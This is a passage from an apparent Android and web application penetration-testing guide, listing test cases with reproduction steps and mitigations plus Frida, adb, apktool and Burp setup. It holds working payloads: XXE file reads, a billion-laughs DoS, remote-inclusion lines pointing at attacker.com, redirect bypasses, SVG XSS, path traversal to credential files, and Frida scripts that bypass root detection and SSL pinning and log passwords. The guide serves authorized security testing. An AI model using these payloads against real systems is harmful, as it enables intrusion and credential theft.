2. Check if registration succeeds
3. Test minimum length requirements
4. Decompile and check validation code

**Expected Result:**  
Strong password policy should be enforced.

**Mitigation:**
- Enforce minimum 8 characters
- Require mix of uppercase, lowercase, numbers, symbols
- Implement password strength meter
- Reject common passwords
- Validate on both client and server

---

### 11.5 Account Suspension/Resumption Issues

**Issue Description:**  
Suspended accounts can still authenticate or perform actions.

**Steps to Reproduce:**
1. Get account suspended by admin
2. Try logging in with suspended account
3. If token was issued before suspension, test if it still works
4. Try password reset on suspended account
5. Test API endpoints with suspended account token

**Expected Result:**  
Suspended accounts should have no access.

**Mitigation:**
- Validate account status on every request
- Invalidate all tokens on suspension
- Check status before password reset
- Implement real-time status checking

---

## 12. SESSION MANAGEMENT

### 12.1 Session Token Invalidation

**Issue Description:**  
Session tokens remain valid after logout.

**Steps to Reproduce:**
1. Log in and capture token in Burp Suite
2. Use the application normally
3. Log out from the application
4. In Burp Suite, replay previous requests with old token
5. Check if requests succeed

**Expected Result:**  
Token should be invalidated after logout.

**Mitigation:**
- Invalidate tokens on logout
- Implement token blacklist
- Use short-lived tokens
- Clear tokens from client storage

---

### 12.2 Concurrent Logins

**Issue Description:**  
Same account can be logged in from multiple devices without restriction.

**Steps to Reproduce:**
1. Log in from Device A
2. Log in from Device B with same credentials
3. Check if both sessions are active
4. Perform actions from both devices
5. Neither session is terminated

**Expected Result:**  
Depends on requirements, but should notify user or limit sessions.

**Mitigation:**
- Implement single session policy (optional)
- Notify users of concurrent logins
- Allow users to view/manage active sessions
- Limit number of concurrent sessions

---

### 12.3 Session Fixation

**Issue Description:**  
Session ID doesn't change after successful authentication.

**Steps to Reproduce:**
1. Open app and note session ID (before login)
2. Log in with credentials
3. Capture session ID after login
4. Compare pre-login and post-login session IDs
5. If same, session fixation exists

**Expected Result:**  
New session ID should be generated after login.

**Mitigation:**
- Generate new session ID on login
- Invalidate old session
- Use secure session management
- Regenerate on privilege escalation

---

### 12.4 Session Token in URL

**Issue Description:**  
Sensitive tokens exposed in URLs can be logged or leaked.

**Steps to Reproduce:**
1. Intercept requests in Burp Suite
2. Look for tokens in URL:
   ```
   GET /api/profile?token=eyJhbGc...
   GET /dashboard?session_id=abc123
   ```
3. Check browser history
4. Check server logs

**Expected Result:**  
Tokens should be in headers, not URLs.

**Mitigation:**
- Use Authorization headers for tokens
- Never pass sensitive data in URLs
- Use POST instead of GET for sensitive operations
- Implement proper token storage

---

## 13. SERVER-SIDE REQUEST FORGERY (SSRF)

### 13.1 Blind SSRF

**Issue Description:**  
Application makes requests to attacker-controlled URLs without displaying response.

**Steps to Reproduce:**
1. Find features that fetch external resources (profile images, webhooks, etc.)
2. Set up a listener:
   ```bash
   nc -lvnp 8080
   ```
3. Submit URL pointing to your listener:
   ```json
   {"image_url": "http://your-ip:8080/test"}
   ```
4. Check if you receive connection
5. Test internal network access:
   ```json
   {"url": "http://127.0.0.1:8080"}
   {"url": "http://169.254.169.254/latest/meta-data/"}
   ```

**Expected Result:**  
Application should not make requests to arbitrary URLs.

**Mitigation:**
- Implement URL whitelist
- Disable redirects
- Validate and sanitize URLs
- Block internal IP ranges
- Use separate network for outbound requests

---

## 14. XML EXTERNAL ENTITIES (XXE)

### 14.1 XXE Attack

**Issue Description:**  
XML parser processes external entities, leading to file disclosure or SSRF.

**Steps to Reproduce:**
1. Find XML input (API endpoints, file uploads)
2. Intercept in Burp Suite
3. Test XXE payload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root>
       <data>&xxe;</data>
   </root>
   ```
4. Check response for file contents

**Expected Result:**  
External entities should be disabled.

**Mitigation:**
- Disable external entity processing
- Use JSON instead of XML
- Update XML parsers
- Validate and sanitize XML input

---

### 14.2 Billion Laughs Attack

**Issue Description:**  
Exponential entity expansion causes denial of service.

**Steps to Reproduce:**
1. Send malicious XML:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
   ]>
   <lolz>&lol3;</lolz>
   ```
2. Monitor server resources
3. Application becomes unresponsive

**Expected Result:**  
XML parser should limit entity expansion.

**Mitigation:**
- Disable entity expansion
- Set entity expansion limits
- Use secure XML parsers
- Implement resource limits

---

## 15. FILE UPLOAD VULNERABILITIES

### 15.1 Bypass Client-Side Validation

**Issue Description:**  
File type validation only on client side can be bypassed.

**Steps to Reproduce:**
1. Find file upload feature
2. Select allowed file (e.g., image.jpg)
3. Intercept request in Burp Suite
4. Change filename and content:
   ```
   filename="malicious.php"
   Content-Type: application/x-php
   ```
5. Forward modified request

**Expected Result:**  
Server-side validation should reject malicious files.

**Mitigation:**
- Implement server-side validation
- Check file content, not just extension
- Use whitelist of allowed types
- Scan uploaded files

---

### 15.2 Double Extension Bypass

**Issue Description:**  
Files with double extensions bypass server validation.

**Steps to Reproduce:**
1. Upload file with double extension:
   ```
   malicious.php.jpg
   shell.asp.png
   ```
2. Intercept and test various combinations
3. Check if file executes on server

**Expected Result:**  
Server should validate properly regardless of extension tricks.

**Mitigation:**
- Validate file content (magic bytes)
- Strip or normalize extensions
- Store files outside webroot
- Randomize uploaded filenames

---

### 15.3 Large File Upload (DoS)

**Issue Description:**  
No file size limit allows uploading huge files causing resource exhaustion.

**Steps to Reproduce:**
1. Create large file:
   ```bash
   dd if=/dev/zero of=large.jpg bs=1M count=1000
   ```
2. Upload via the application
3. Monitor server resources
4. Upload multiple large files simultaneously

**Expected Result:**  
File size should be limited.

**Mitigation:**
- Implement file size limits
- Use streaming uploads
- Implement rate limiting
- Monitor disk usage

---

### 15.4 SVG File Upload XSS

**Issue Description:**  
SVG files can contain JavaScript that executes when viewed.

**Steps to Reproduce:**
1. Create malicious SVG:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg">
   <script>alert('XSS')</script>
   </svg>
   ```
2. Upload as profile picture or attachment
3. View the uploaded file
4. Check if JavaScript executes

**Expected Result:**  
SVG files should be sanitized or blocked.

**Mitigation:**
- Sanitize SVG files
- Serve with Content-Type: image/svg+xml
- Implement Content Security Policy
- Consider blocking SVG uploads

---

## 16. FILE INCLUSION

### 16.1 Local File Inclusion (LFI)

**Issue Description:**  
Application includes local files based on user input without validation.

**Steps to Reproduce:**
1. Find file inclusion functionality
2. Test path traversal:
   ```
   file=../../../../etc/passwd
   page=../../shared_prefs/credentials.xml
   ```
3. Test in WebView URLs:
   ```
   file:///data/data/com.example.app/databases/users.db
   ```
4. Intercept and modify in Burp Suite

**Expected Result:**  
Application should only include whitelisted files.

**Mitigation:**
- Use whitelist of allowed files
- Validate and sanitize file paths
- Use indirect references
- Implement proper access controls

---

### 16.2 Remote File Inclusion (RFI)

**Issue Description:**  
Application includes remote files from attacker-controlled servers.

**Steps to Reproduce:**
1. Find dynamic file inclusion
2. Test with remote URLs:
   ```
   include=http://attacker.com/malicious.php
   page=http://evil.com/shell.txt
   ```
3. Host malicious file on your server
4. Check if it's included/executed

**Expected Result:**  
Remote file inclusion should be blocked.

**Mitigation:**
- Disable remote file inclusion
- Validate URLs strictly
- Use whitelist approach
- Implement proper input validation

---

## 17. BUSINESS LOGIC BYPASS

### 17.1 Price Tampering

**Issue Description:**  
Product prices can be manipulated during checkout process.

**Steps to Reproduce:**
1. Add item to cart
2. Proceed to checkout
3. Intercept request in Burp Suite
4. Modify price parameter:
   ```json
   {
     "item_id": "123",
     "price": 0.01,
     "quantity": 1
   }
   ```
5. Complete purchase
6. Check if manipulated price is accepted

**Expected Result:**  
Price should be validated server-side against database.

**Mitigation:**
- Never trust client-side prices
- Validate prices server-side
- Use signed price tokens
- Log price discrepancies
- Implement integrity checks

---

## 18. SECURITY MISCONFIGURATION

### 18.1 CORS Misconfiguration

**Issue Description:**  
Overly permissive CORS policy allows unauthorized cross-origin requests.

**Steps to Reproduce:**
1. Intercept API request in Burp Suite
2. Add/modify Origin header:
   ```
   Origin: http://attacker.com
   ```
3. Check response headers:
   ```
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```
4. Test if you can make cross-origin requests

**Expected Result:**  
CORS should be restrictive and specific.

**Mitigation:**
- Specify allowed origins explicitly
- Never use wildcard with credentials
- Validate Origin header
- Implement proper CORS policy

---

### 18.2 Host Header Injection

**Issue Description:**  
Application trusts Host header for generating URLs or redirects.

**Steps to Reproduce:**
1. Intercept request in Burp Suite
2. Modify Host header:
   ```
   Host: attacker.com
   ```
3. Check if response contains attacker.com
4. Test password reset functionality
5. See if reset link points to attacker domain

**Expected Result:**  
Host header should be validated.

**Mitigation:**
- Validate Host header against whitelist
- Use absolute URLs
- Configure virtual host properly
- Don't trust Host header for security decisions

---

### 18.3 Password Reset Poisoning

**Issue Description:**  
Password reset emails contain links with attacker-controlled domains.

**Steps to Reproduce:**
1. Initiate password reset
2. Intercept request in Burp Suite
3. Modify Host header:
   ```
   Host: attacker.com
   ```
4. Check reset email
5. If link points to attacker.com, victim token is stolen

**Expected Result:**  
Reset links should use hardcoded domain.

**Mitigation:**
- Use hardcoded domain for reset links
- Validate Host header
- Use absolute URLs
- Implement rate limiting on reset

---

## 19. ENUMERATION

### 19.1 Missing Security Headers

**Issue Description:**  
HTTP responses lack security headers exposing app to various attacks.

**Steps to Reproduce:**
1. Intercept response in Burp Suite
2. Check for missing headers:
   ```
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Content-Security-Policy: ...
   Strict-Transport-Security: ...
   ```
3. Use online tools to scan headers

**Expected Result:**  
All security headers should be present.

**Mitigation:**
- Implement all security headers
- Use HSTS for HTTPS enforcement
- Implement CSP
- Add X-Frame-Options

---

### 19.2 Server Information Disclosure

**Issue Description:**  
Server headers reveal technology stack and versions.

**Steps to Reproduce:**
1. Capture response in Burp Suite
2. Check headers:
   ```
   Server: Apache/2.4.7 (Ubuntu)
   X-Powered-By: PHP/5.6.2
   ```
3. Version information helps attackers find exploits

**Expected Result:**  
No version information in headers.

**Mitigation:**
- Remove/obfuscate Server headers
- Remove X-Powered-By headers
- Configure server to hide version info

---

### 19.3 Directory Brute-Force

**Issue Description:**  
Hidden directories can be discovered through brute-force.

**Steps to Reproduce:**
1. Use Burp Intruder or tools like dirb:
   ```bash
   dirb http://api.example.com /usr/share/wordlists/dirb/common.txt
   ```
2. Test common paths:
   ```
   /admin
   /backup
   /test
   /dev
   /api/v1
   ```
3. Check response codes

**Expected Result:**  
Sensitive directories should require authentication.

**Mitigation:**
- Implement authentication on all directories
- Disable directory listing
- Use access control
- Remove unnecessary directories

---

### 19.4 Admin Panel Disclosure

**Issue Description:**  
Admin panel accessible or discoverable without authentication.

**Steps to Reproduce:**
1. Test common admin URLs:
   ```
   /admin
   /administrator
   /admin_panel
   /control_panel
   ```
2. Decompile APK and search for admin paths
3. Use directory brute-force

**Expected Result:**  
Admin panel should require strong authentication.

**Mitigation:**
- Implement strong authentication
- Use non-standard URLs
- Implement IP restrictions
- Add WAF rules
- Monitor access attempts

---

### 19.5 Accessing Default Files

**Issue Description:**  
Default files like phpMyAdmin, adminer accessible without protection.

**Steps to Reproduce:**
1. Test common default paths:
   ```
   /phpmyadmin/
   /adminer.php
   /wp-admin/
   /api/docs/
   ```
2. Check if accessible without authentication

**Expected Result:**  
Default admin tools should be removed or protected.

**Mitigation:**
- Remove default tools from production
- Implement authentication
- Change default URLs
- Use IP whitelisting

---

## 20. IMPROPER ERROR HANDLING

### 20.1 Insecure Error Messages

**Issue Description:**  
Detailed error messages reveal sensitive information about application structure.

**Steps to Reproduce:**
1. Submit invalid input to trigger errors
2. Test SQL injection to trigger database errors
3. Access non-existent resources
4. Check error responses:
   ```
   Error: mysqli_query() expects parameter 2 to be string
   Error: File not found: /var/www/app/config/database.php
   ```

**Expected Result:**  
Generic error messages should be displayed.

**Mitigation:**
- Implement generic error messages
- Log detailed errors server-side
- Disable debug mode in production
- Custom error pages

---

### 20.2 Stack Trace Disclosure

**Issue Description:**  
Application displays full stack traces revealing code structure.

**Steps to Reproduce:**
1. Submit malicious input
2. Trigger exceptions intentionally
3. Check response for stack traces:
   ```
   java.lang.NullPointerException
   at com.example.app.UserController.getUser(UserController.java:45)
   at com.example.app.SecurityFilter.doFilter(SecurityFilter.java:89)
   ```

**Expected Result:**  
Stack traces should not be visible to users.

**Mitigation:**
- Catch and handle all exceptions
- Display generic error messages
- Log stack traces server-side
- Disable debug mode

---

## 21. RATE LIMITING

### 21.1 No Rate Limiting on Critical Functions

**Issue Description:**  
Absence of rate limiting allows brute force, enumeration, and DoS attacks.

**Steps to Reproduce:**
1. Identify critical endpoints (login, signup, password reset, OTP)
2. Use Burp Intruder to send multiple requests rapidly:
   ```
   POST /api/login (100 requests in 10 seconds)
   POST /api/send_otp (50 requests in 5 seconds)
   ```
3. Check if all requests are processed
4. Monitor for account lockout or delays

**Expected Result:**  
Rate limiting should prevent rapid requests.

**Mitigation:**
- Implement rate limiting per IP/user
- Add progressive delays
- Implement CAPTCHA after threshold
- Use account lockout mechanisms
- Monitor and alert on abuse

---

## 22. UNVALIDATED REDIRECTS

### 22.1 Open Redirect

**Issue Description:**  
Application redirects to URLs without validation, enabling phishing attacks.

**Steps to Reproduce:**
1. Find redirect functionality (login, logout, external links)
2. Intercept in Burp Suite
3. Modify redirect parameter:
   ```
   redirect=http://attacker.com
   next=//evil.com
   url=javascript:alert('XSS')
   ```
4. Check if application redirects to malicious URL
5. Test various bypass techniques:
   ```
   redirect=//attacker.com
   redirect=https://app.com@attacker.com
   redirect=https://attacker.com%2f@app.com
   ```

**Expected Result:**  
Only whitelisted domains should be allowed.

**Mitigation:**
- Implement URL whitelist
- Validate redirect destinations
- Use relative URLs when possible
- Warn users about external redirects
- Avoid user-controlled redirects

---

## 23. VULNERABLE COMPONENTS

### 23.1 Outdated Libraries/Components

**Issue Description:**  
Application uses outdated libraries with known vulnerabilities.

**Steps to Reproduce:**
1. Run MobSF scan on APK
2. Check build.gradle for dependencies:
   ```bash
   jadx application.apk
   # Navigate to build files
   ```
3. List libraries:
   ```bash
   unzip application.apk
   ls lib/
   ```
4. Search for known vulnerabilities:
   - Check CVE databases
   - Use dependency-check tools
5. Example vulnerable libraries:
   ```
   com.squareup.okhttp:okhttp:2.7.5 (Old version with vulnerabilities)
   ```

**Expected Result:**  
All components should be up-to-date.

**Mitigation:**
- Regularly update all dependencies
- Use dependency scanning tools
- Monitor security advisories
- Remove unused libraries
- Implement update policy

---

### 23.2 Outdated Framework/CMS

**Issue Description:**  
Application uses outdated frameworks vulnerable to known exploits.

**Steps to Reproduce:**
1. Identify framework version in code or responses
2. Check for known vulnerabilities:
   - Android SDK version
   - Third-party SDK versions
3. Use MobSF to identify outdated components
4. Search exploit databases

**Expected Result:**  
Latest stable versions should be used.

**Mitigation:**
- Keep frameworks updated
- Subscribe to security bulletins
- Test updates in staging
- Implement automated update checks

---

## 24. SENSITIVE DATA EXPOSURE

### 24.1 Sensitive Data in Code/Resources

**Issue Description:**  
Sensitive information exposed in JavaScript, HTML, or resource files.

**Steps to Reproduce:**
1. Extract APK:
   ```bash
   unzip application.apk -d extracted/
   ```
2. Search in resources:
   ```bash
   grep -r "api_key" extracted/res/
   grep -r "password" extracted/res/
   grep -r "secret" extracted/assets/
   ```
3. Check strings.xml:
   ```bash
   cat extracted/res/values/strings.xml
   ```
4. Decompile and search source:
   ```bash
   jadx application.apk
   grep -r "API_KEY" output/
   ```

**Example Findings:**
```xml
<string name="api_key">AIzaSyD1234567890abcdefg</string>
<string name="db_password">MySecretP@ss</string>
```

**Expected Result:**  
No sensitive data in application resources.

**Mitigation:**
- Never hardcode sensitive data
- Use server-side configuration
- Implement proper secret management
- Use environment variables
- Encrypt sensitive configuration

---

## TESTING WORKFLOW

### Initial Setup
1. **Install tools:**
   ```bash
   # Install MobSF
   git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
   cd Mobile-Security-Framework-MobSF
   ./setup.sh
   
   # Install other tools
   sudo apt install adb apktool
   ```

2. **Setup Emulator:**
   - Install Genymotion or Android Studio emulator
   - Configure proxy settings for Burp Suite
   - Install Burp CA certificate

3. **Setup Burp Suite:**
   - Configure proxy listener (127.0.0.1:8080)
   - Export CA certificate
   - Install certificate on device/emulator
   - Configure device proxy settings

### Testing Process

1. **Static Analysis:**
   ```bash
   # Upload APK to MobSF
   # Or run locally
   python manage.py runserver 0.0.0.0:8000
   ```

2. **Decompile APK:**
   ```bash
   apktool d application.apk -o output/
   jadx application.apk -d source/
   ```

3. **Dynamic Analysis:**
   ```bash
   # Install APK
   adb install application.apk
   
   # Monitor logs
   adb logcat | grep "com.example.app"
   
   # Inspect file system
   adb shell
   cd /data/data/com.example.app/
   ```

4. **Network Analysis:**
   - Start Burp Suite
   - Configure device proxy
   - Use application and capture traffic
   - Analyze requests/responses

5. **Runtime Analysis with Frida:**
   ```bash
   # Install Frida server on device
   adb push frida-server /data/local/tmp/
   adb shell chmod 755 /data/local/tmp/frida-server
   adb shell /data/local/tmp/frida-server &
   
   # List processes
   frida-ps -U
   
   # Hook application
   frida -U -f com.example.app -l script.js
   ```

---

## COMMON FRIDA SCRIPTS FOR TESTING

### Bypass Root Detection
```javascript
Java.perform(function() {
    var RootCheck = Java.use("com.example.app.RootDetection");
    RootCheck.isRooted.implementation = function() {
        console.log("Root check bypassed");
        return false;
    };
});
```

### Bypass SSL Pinning
```javascript
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        console.log("SSL Pinning bypassed");
        return;
    };
});
```

### Hook Method to View Parameters
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.example.app.LoginActivity");
    TargetClass.validateCredentials.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        return this.validateCredentials(username, password);
    };
});
```

### Dump Shared Preferences
```javascript
Java.perform(function() {
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var prefs = context.getSharedPreferences("user_prefs", 0);
    var allEntries = prefs.getAll();
    var iterator = allEntries.entrySet().iterator();
    
    while(iterator.hasNext()) {
        var entry = iterator.next();
        console.log(entry.getKey() + ": " + entry.getValue());
    }
});
```

---

## BURP SUITE CONFIGURATION FOR MOBILE TESTING

### Install CA Certificate on Android

1. **Export Burp Certificate:**
   - Burp Suite → Proxy → Options → Import/Export CA Certificate
   - Export in DER format

2. **Convert to PEM (if needed):**
   ```bash
   openssl x509 -inform DER -in cacert.der -out cacert.pem
   ```

3. **Install on Device:**
   ```bash
   # For Android 7+, install as system certificate
   adb root
   adb remount
   openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
   # Rename certificate to hash value
   mv cacert.pem <hash>.0
   adb push <hash>.0 /system/etc/security/cacerts/
   adb shell chmod 644 /system/etc/security/cacerts/<hash>.0
   adb reboot
   ```

4. **Configure Proxy on Device:**
   - Settings → Wi-Fi → Long press network → Modify Network
   - Advanced Options → Proxy: Manual
   - Hostname: Your PC IP
   - Port: 8080

---

## USEFUL ADB COMMANDS

### Basic Commands
```bash
# List connected devices
adb devices

# Install APK
adb install application.apk

# Uninstall application
adb uninstall com.example.app

# Clear app data
adb shell pm clear com.example.app

# Start activity
adb shell am start -n com.example.app/.MainActivity

# Force stop app
adb shell am force-stop com.example.app
```

### File Operations
```bash
# Pull file from device
adb pull /data/data/com.example.app/databases/db.sqlite

# Push file to device
adb push file.txt /sdcard/

# List files
adb shell ls -la /data/data/com.example.app/

# View file content
adb shell cat /data/data/com.example.app/shared_prefs/prefs.xml
```

### Package Information
```bash
# List all packages
adb shell pm list packages

# Get package info
adb shell dumpsys package com.example.app

# Get app path
adb shell pm path com.example.app

# Pull APK from device
adb pull /data/app/com.example.app-1/base.apk
```

### Logcat Commands
```bash
# View all logs
adb logcat

# Filter by package
adb logcat | grep com.example.app

# Clear logs
adb logcat -c

# Save logs to file
adb logcat > logfile.txt

# Filter by tag
adb logcat -s TAG_NAME

# View only errors
adb logcat *:E
```

### Database Operations
```bash
# Access database
adb shell
cd /data/data/com.example.app/databases/
sqlite3 database.db

# SQL commands in sqlite3
.tables
.schema tablename
SELECT * FROM users;
.exit
```

---

## APKTOOL USAGE

### Decompile APK
```bash
# Basic decompile
apktool d application.apk

# Decompile to specific folder
apktool d application.apk -o output_folder

# Decompile without resources
apktool d application.apk -r

# Decompile without sources
apktool d application.apk -s
```

### Recompile APK
```bash
# Rebuild APK
apktool b output_folder

# Output to specific file
apktool b output_folder -o modified.apk
```

### Sign Modified APK
```bash
# Generate keystore (first time)
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore modified.apk alias_name

# Verify signature
jarsigner -verify -verbose -certs modified.apk

# Align APK (optional but recommended)
zipalign -v 4 modified.apk modified-aligned.apk
```

---

## JADX USAGE

### Command Line
```bash
# Decompile to Java source
jadx application.apk

# Output to specific directory
jadx application.apk -d output_directory

# Export as gradle project
jadx application.apk --export-gradle

# Decompile specific class
jadx application.apk -e com.example.app.MainActivity
```

### GUI Mode
```bash
# Open JADX GUI
jadx-gui application.apk
```

### Search in JADX
- Text search: Ctrl+F
- Class search: Ctrl+Shift+F
- Find usage: Ctrl+H

---

## MOBSF USAGE

### Starting MobSF
```bash
cd Mobile-Security-Framework-MobSF
./run.sh  # Linux/Mac
run.bat   # Windows
```

### Access MobSF
- Open browser: http://127.0.0.1:8000
- Upload APK file
- Wait for analysis to complete
- Review findings

### MobSF Features
- Static Analysis
- Dynamic Analysis (with Genymotion)
- Malware Analysis
- Code Review
- Security Scorecard
- PDF Report Generation

### Dynamic Analysis with MobSF
1. Start Genymotion emulator
2. Install MobSF agent on emulator
3. Configure MobSF settings
4. Start dynamic analysis
5. Use the application
6. Stop analysis and review findings

---

## GENYMOTION SETUP

### Installation
1. Download from https://www.genymotion.com/
2. Install VirtualBox (required)
3. Install Genymotion
4. Create account and sign in

### Create Virtual Device
1. Open Genymotion
2. Add new device
3. Select Android version (8.0 or 9.0 recommended for testing)
4. Start virtual device

### Configure for Testing
```bash
# Install ARM translation (for ARM apps on x86 emulator)
# Download ARM Translation zip
adb push Genymotion-ARM-Translation.zip /sdcard/
# Flash from recovery or install

# Root device (Genymotion is rooted by default)
adb root

# Install Xposed Framework (optional)
# Download and flash Xposed installer
```

---

## TESTING CHECKLIST

### Pre-Testing
- [ ] Set up testing environment
- [ ] Install all required tools
- [ ] Configure emulator/device
- [ ] Set up Burp Suite proxy
- [ ] Install Burp CA certificate
- [ ] Obtain APK file
- [ ] Create testing documentation template

### Static Analysis
- [ ] Run MobSF scan
- [ ] Decompile with APKTool
- [ ] Decompile with JADX
- [ ] Review AndroidManifest.xml
- [ ] Check for hardcoded secrets
- [ ] Analyze code for vulnerabilities
- [ ] Check library versions
- [ ] Review obfuscation
- [ ] Check signing certificate
- [ ] Analyze permissions

### Dynamic Analysis
- [ ] Install app on test device
- [ ] Configure proxy
- [ ] Monitor network traffic
- [ ] Test authentication
- [ ] Test authorization
- [ ] Test data storage
- [ ] Test data transmission
- [ ] Check logging behavior
- [ ] Test deep links
- [ ] Test exported components
- [ ] Test file operations
- [ ] Test WebView security
- [ ] Test certificate pinning
- [ ] Test root detection

### Runtime Analysis
- [ ] Hook application with Frida
- [ ] Bypass security controls
- [ ] Monitor method calls
- [ ] Dump memory
- [ ] Extract tokens/keys
- [ ] Test tamper detection

### API Testing
- [ ] Map all API endpoints
- [ ] Test authentication
- [ ] Test authorization (IDOR, privilege escalation)
- [ ] Test injection vulnerabilities
- [ ] Test rate limiting
- [ ] Test business logic
- [ ] Test file uploads
- [ ] Test CORS policy
- [ ] Test error handling

### Reporting
- [ ] Document all findings
- [ ] Assign severity ratings
- [ ] Provide reproduction steps
- [ ] Include screenshots/videos
- [ ] Suggest remediation
- [ ] Create executive summary
- [ ] Generate detailed technical report

---

## SEVERITY RATING GUIDE

### Critical
- Remote code execution
- Authentication bypass
- SQL injection with data access
- Hardcoded credentials in production
- Severe data leakage

### High
- Privilege escalation
- Insecure data storage of sensitive data
- Missing SSL/TLS
- Broken authentication
- IDOR with PII access
- XSS in sensitive contexts

### Medium
- Information disclosure
- Insecure logging
- Missing security headers
- Weak password policy
- Session management issues
- Exported components without validation

### Low
- Version disclosure
- Missing rate limiting (non-critical functions)
- Verbose error messages
- Unnecessary permissions
- Minor configuration issues

### Informational
- Security best practices
- Recommendations
- Optimization suggestions

---

## COMMON PITFALLS TO AVOID

1. **Testing Production Environment:**
   - Always test on staging/development
   - Never test on live production apps without authorization

2. **Insufficient Documentation:**
   - Always document steps clearly
   - Include screenshots and traffic captures
   - Provide clear remediation steps

3. **False Positives:**
   - Verify all findings manually
   - Don't rely solely on automated tools
   - Understand the context

4. **Scope Creep:**
   - Stay within authorized scope
   - Don't test related apps without permission
   - Follow the engagement rules

5. **Missing Authorization:**
   - Always have written authorization
   - Understand legal boundaries
   - Follow responsible disclosure

---

## REMEDIATION PRIORITY

### Immediate Actions (Critical)
1. Remove hardcoded credentials
2. Fix authentication bypasses
3. Patch SQL injection vulnerabilities
4. Implement SSL/TLS
5. Fix severe data leakage

### Short Term (High)
1. Implement proper access controls
2. Encrypt sensitive data storage
3. Fix privilege escalation
4. Implement certificate pinning
5. Secure exported components

### Medium Term (Medium)
1. Improve logging practices
2. Add security headers
3. Implement rate limiting
4. Strengthen password policy
5. Review session management

### Long Term (Low/Info)
1. Remove version disclosure
2. Implement best practices
3. Code review and refactoring
4. Security training for developers
5. Establish secure SDLC

---

## USEFUL RESOURCES

### Documentation
- OWASP Mobile Security Testing Guide (MSTG)
- OWASP Mobile Top 10
- Android Developer Security Documentation
- Frida Documentation

### Tools Downloads
- MobSF: https://github.com/MobSF/Mobile-Security-Framework-MobSF
- JADX: https://github.com/skylot/jadx
- APKTool: https://ibotpeaches.github.io/Apktool/
- Frida: https://frida.re/
- Genymotion: https://www.genymotion.com/
- Burp Suite: https://portswigger.net/burp

### Learning Resources
- OWASP MSTG: https://mobile-security.gitbook.io/
- Android Security Documentation
- HackerOne Mobile Hacking Reports
- Bug Bounty Writeups

### Communities
- Reddit: r/netsec, r/bugbounty
- Twitter: Follow security researchers
- Discord/Slack: Security communities
- Conferences: DEF CON, Black Hat, OWASP AppSec

---

## REPORT TEMPLATE

### Executive Summary
- Overview of testing engagement
- Key findings summary
- Risk summary
- Recommendations overview

### Methodology
- Testing approach
- Tools used
- Scope and limitations
- Testing timeline

### Findings

For each vulnerability:

**[VULN-001] Vulnerability Title**

**Severity:** Critical/High/Medium/Low/Info

**Description:**
Clear description of the vulnerability

**Impact:**
What could an attacker achieve?

**Affected Component:**
- Package: com.example.app
- Activity/Service/etc: LoginActivity
- API Endpoint: /api/login

**Steps to Reproduce:**
1. Step one
2. Step two
3. Step three

**Proof of Concept:**
```
Code or commands demonstrating the issue
```

**Evidence:**
[Screenshots/Videos/Traffic captures]

**Remediation:**
Specific steps to fix the vulnerability

**References:**
- OWASP MSTG
- CWE references
- CVE IDs if applicable

---

## FINAL NOTES

### Best Practices for Testers

1. **Always get written authorization** before testing any application
2. **Document everything** - steps, findings, evidence
3. **Verify findings** - ensure no false positives
4. **Be thorough but efficient** - cover all test cases systematically
5. **Communicate clearly** - make reports understandable for developers
6. **Stay updated** - new vulnerabilities and techniques emerge constantly
7. **Be ethical** - follow responsible disclosure practices
8. **Respect privacy** - don't access or exfiltrate real user data
9. **Test safely** - use isolated environments when possible
10. **Learn continuously** - mobile security is constantly evolving

### Common Beginner Mistakes

1. Testing without proper authorization
2. Not documenting steps clearly
3. Reporting false positives
4. Not understanding business context
5. Over-relying on automated tools
6. Not verifying findings manually
7. Poor communication in reports
8. Testing on production without permission
9. Not following up on remediation
10. Ignoring legal and ethical boundaries

### Continuous Learning

- Practice on vulnerable apps (DIVA, InsecureBankv2, etc.)
- Participate in bug bounty programs
- Read security research and writeups
- Attend security conferences
- Contribute to open-source security tools
- Join security communities
- Stay updated with latest Android security features
- Learn from experienced researchers

---

## QUICK REFERENCE COMMANDS

```bash
# APK Analysis
apktool d app.apk
jadx app.apk -d output/
unzip app.apk -d extracted/

# Device Connection
adb devices
adb shell
adb root
adb remount

# Installation
adb install app.apk
adb uninstall com.package.name

# File Operations
adb pull /data/data/com.app/databases/db.sqlite
adb push file.txt /sdcard/
adb shell cat /data/data/com.app/shared_prefs/prefs.xml

# Component Testing
adb shell am start -n com.app/.Activity
adb shell am startservice -n com.app/.Service
adb shell am broadcast -a com.app.ACTION

# Logging
adb logcat
adb logcat | grep "app"
adb logcat -c

# Frida
frida-ps -U
frida -U -f com.app -l script.js
frida -U com.app

# Burp Certificate Hash
openssl x509 -inform PEM -subject_hash_old -in cert.pem | head -1

# Recompile & Sign
apktool b folder/ -o new.apk
jarsigner -keystore key.keystore new.apk alias
zipalign -v 4 new.apk aligned.apk
```

---

**Remember:** This guide is for educational purposes and authorized security testing only. Always obtain proper authorization before testing any application. Unauthorized testing is illegal and unethical.

**Good luck with your Android penetration testing journey!
